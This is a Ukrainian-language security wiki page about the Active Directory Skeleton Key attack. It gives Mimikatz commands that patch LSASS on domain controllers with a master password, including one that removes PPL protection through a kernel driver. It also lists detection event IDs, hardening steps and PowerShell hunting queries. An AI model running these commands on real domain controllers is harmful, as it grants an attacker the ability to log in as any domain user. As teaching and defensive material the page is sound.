# Skeleton Key

{{#include ../../banners/hacktricks-training.md}}

## Skeleton Key Attack

The **Skeleton Key attack** — це техніка, що дозволяє зловмисникам **bypass Active Directory authentication** шляхом **injecting a master password** у процес LSASS кожного domain controller. Після ін'єкції master password (за замовчуванням **`mimikatz`**) можна використовувати для автентифікації як **any domain user**, при цьому їхні реальні паролі продовжують працювати.

Ключові факти:

- Потребує **Domain Admin/SYSTEM + SeDebugPrivilege** на кожному DC і має бути **reapplied after each reboot**.
- Втручається в шляхи валідації **NTLM** та **Kerberos RC4 (etype 0x17)**; AES-only realms або облікові записи з примусовим AES **не приймуть the skeleton key**.
- Може конфліктувати з third‑party LSA authentication packages або додатковими smart‑card / MFA провайдерами.
- Модуль Mimikatz приймає опційний ключ `/letaes`, щоб уникнути втручання в Kerberos/AES hooks у випадку проблем сумісності.

### Виконання

Класичний, без PPL-захищений LSASS:
```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```
Якщо **LSASS запущено як PPL** (RunAsPPL/Credential Guard/Windows 11 Secure LSASS), потрібен драйвер ядра, щоб зняти захист перед патчуванням LSASS:
```text
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove   # drop PPL
mimikatz # misc::skeleton                               # inject master password 'mimikatz'
```
Після ін'єкції автентифікуйтеся з будь-яким доменним обліковим записом, але використовуйте пароль `mimikatz` (або значення, встановлене оператором). Пам'ятайте повторити на **всіх DCs** у середовищах з кількома DC.

## Заходи пом'якшення

- **Моніторинг журналів**
- System **Event ID 7045** (встановлення сервісу/драйвера) для неподписаних драйверів, таких як `mimidrv.sys`.
- **Sysmon**: Event ID 7 (завантаження драйвера) для `mimidrv.sys`; Event ID 10 для підозрілих звернень до `lsass.exe` з не‑системних процесів.
- Security **Event ID 4673/4611** для використання чутливих привілеїв або аномалій реєстрації LSA authentication package; корелюйте з несподіваними входами 4624, що використовують RC4 (etype 0x17) з DCs.
- **Зміцнення LSASS**
- Тримайте увімкненими **RunAsPPL/Credential Guard/Secure LSASS** на DCs, щоб змусити нападників переходити до розгортання драйверів у kernel‑mode (більше телеметрії, складніше для експлуатації).
- Вимкніть за можливості застарілий **RC4**; обмеження квитків Kerberos до AES запобігає шляху хука RC4, який використовує skeleton key.
- Швидкі PowerShell пошуки:
- Виявлення встановлень неподписаних kernel драйверів: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}`
- Пошук драйвера Mimikatz: `Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*" -and $_.message -like "*mimidrv*"}`
- Перевірити, що PPL застосовано після перезавантаження: `Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}`

For additional credential‑hardening guidance check [Windows credentials protections](../stealing-credentials/credentials-protections.md).

## Посилання

- [Netwrix – Skeleton Key attack in Active Directory (2022)](https://blog.netwrix.com/2022/11/29/skeleton-key-attack-active-directory/)
- [TheHacker.recipes – Skeleton key (2026)](https://www.thehacker.recipes/ad/persistence/skeleton-key/)
- [TheHacker.Tools – Mimikatz misc::skeleton module](https://tools.thehacker.recipes/mimikatz/modules/misc/skeleton)

{{#include ../../banners/hacktricks-training.md}}
